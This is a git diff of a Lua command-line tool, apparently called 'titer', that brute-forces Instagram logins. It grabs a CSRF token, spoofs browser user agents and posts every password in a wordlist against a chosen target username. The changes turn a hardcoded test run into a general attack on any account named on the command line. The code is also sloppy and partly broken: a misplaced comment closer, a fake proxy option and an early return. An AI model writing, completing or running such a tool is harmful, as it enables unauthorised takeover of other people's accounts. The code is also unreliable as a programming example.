@@ -3,7 +3,6 @@ local argparse = require('argparse')
 local http = require('socket.http') 
 local ltn = require('ltn12')
 local lib = require("lib/lib")
-local json = require("cjson")
 
 local titer = [[
                 `         '
@@ -31,16 +30,10 @@ local request_payload = [[queryParams={}&optIntoOneTap=false]]
 local csrf = nil
 local request_headers = nil
 
-local function attack(password, tor)
-	-- Generating fake user agent
+local function attack(password, proxy)
+	-- Generating fake user igent
 	request_payload = request_payload .. "&enc_password=#PWD_INSTAGRAM_BROWSER:0:" .. os.time() .. ":" .. password
-	request_headers["User-Agent"] = fake_Agent()
-	
-	print(request_payload)
-	Wait(3)
-	for x,v in pairs(request_headers) do
-		print(x .. " " .. v)
-	end
+	request_headers["User-Agent"] = fake_Agents()
 
 	local attack_response = {}
 	http.request {
@@ -50,9 +43,13 @@ local function attack(password, tor)
 		source = ltn.source.string(request_payload),
 		sink = ltn.sink.table(attack_response)
 	}
+	if proxy == "enabled" then 
+		print("proxy is enabled")
+	else
+	end
 
 	for _,resp in pairs(attack_response) do
-		print(resp)
+		return resp
 	end
 end
 
@@ -62,21 +59,37 @@ local function main()
     	description = titer,
     	epilog = "Usage: titer -t blackarch -w wordlist.txt -p disable"
     }
+	
     parser:option('-t --target', "Specify target instagram username")
     parser:option('-w --wordlist', "Specify wordlist file path")
-    parser:option('-p --proxy', "Enable or Disable tor service")
+    parser:option('-p --proxy', "Enable or Disable proxyt server")
     	:choices {"enable", "disable"}
     parser:flag('-v --version', "Get current version of soft"):action(function()
     	print("titer v1.0.0(alpha)")
     	os.exit(0)
     end)
     parser:flag('-a --asci', 'Print titer ascii'):action(function()
-    	print(titer)
-    	os.exit(0)
+		print(titer)
+		os.exit(1)
     end)
     local args = parser:parse()
-    request_payload = request_payload .. "&username=sudopacmandeleteme"
+	
+    -- Checking if all arguments exists TODO if not args.proxy doesn't work
+	if not args.target then
+		parser:error("no target specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
+	elseif args.wordlist == nil then
+		parser:error("no wordlist file specifyed\nExample: titer -t blackarch -w wordlist.txt -p disable")
+	elseif args.wordlist then
+		local words = io.open(args.wordlist)
+		if not words then
+			parser:error(args.wordlist .. " wordlist path doesn't found")
+		end
+	elseif not args.proxy then
+		parser:error("enable or disable proxy server\nExample: titer -t blackarch -w wordlist.txt -p disable")
+	end
+
     -- Making http request to instagram to get csrf token
+    request_payload = request_payload .. "&username=" .. args.target
     local body,code,headers = http.request {
     	url = "https://instagram.com/accounts/login/",
     	method = "GET",
@@ -85,8 +98,6 @@ local function main()
     for _,cooks in pairs(headers) do
     	if cooks:find("csrftoken") then
     		csrf = cooks:match('csrftoken=.*'):sub(11, -485)
-    		print(csrf)
-    		--request_headers["x-csrftoken"] = csrf
     		break
     	end
     end
@@ -96,27 +107,11 @@ local function main()
     	["Referer"] = "http://www.instagram.com/accounts/login",
     	["x-csrftoken"] = csrf,
     	["User-Agent"] = fake_Agents()
-    }
+    }--]]
     -- Checking if --wordlist exist TODO find better way with argparse
-    --[[local open = io.open(args.wordlist, 'r')
-    if open then
-    	open:close()
-    	for brute in io.lines(args.wordlist) do
-    		attack(args.target, brute, args.proxy)
-    	end
-    else
-    	print("[-] " .. args.wordlist .. " file path doesn't found\n[+] trying to open" .. args.wordlist .. ".txt file")
-    	local open_txt = io.open(args.wordlist .. ".txt")
-    	if open_txt then
-    		for brute in io.lines(args.wordlist .. ".txt") do
-    			attack(args.target, brute, args.proxy)
-    		end
-    	else
-    		print("[-] wordlist file path doesn't found")
-    		os.exit(0)
-    		end
-    end]]--
-    attack("sudopacmandeleteme", "sudopacmandeleteme17G", "disable")
+	for pass in io.lines(args.wordlist) do
+		attack(pass, "enable")
+	end
 end
 
 main()
